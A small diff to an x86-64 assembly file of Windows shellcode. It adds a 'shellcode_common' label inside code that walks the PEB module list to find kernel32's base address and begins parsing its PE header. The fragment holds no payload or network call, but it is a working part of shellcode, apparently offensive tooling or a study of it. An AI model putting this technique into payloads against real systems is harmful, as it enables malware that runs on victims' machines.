@@ -68,6 +68,7 @@ shellcode:
     MOV     RSI, [RAX]                    ; RSI = InLoadOrder[2] (kernel32)
     MOV     RDI, [RSI + 0x30]             ; RDI = [InLoadOrder[2] + 0x30] = kernel32 DllBase
 ; Found kernel32 base address (RDI)
+shellcode_common:
     ADD     EDX, DWORD [RDI + 0x3C]       ; RBX = 0x60 + [kernel32 + 0x3C] = offset(PE header) + 0x60
 ; PE header (RDI+RDX-0x60) = @0x00 0x04 byte signature
 ;                            @0x04 0x18 byte COFF header
